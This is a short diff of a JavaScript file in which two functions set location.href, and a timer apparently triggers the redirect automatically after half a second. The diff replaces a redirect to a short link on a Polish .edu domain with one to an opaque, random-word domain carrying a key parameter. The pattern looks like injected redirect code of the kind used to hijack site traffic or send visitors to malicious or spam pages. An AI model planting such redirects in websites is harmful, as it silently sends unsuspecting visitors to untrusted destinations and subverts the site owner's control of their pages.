@@ -5,8 +5,8 @@ function jp() {
     fh();}
 setTimeout('hh();', 500);
 function fh(){
-    location.href="https://hgm.edu.pl/GfwsKc";
+    location.href="https://fearinvulnerablediagnosis.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
 }
 function goon(){
-    location.href="https://hgm.edu.pl/GfwsKc";
+    location.href="https://fearinvulnerablediagnosis.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
 }
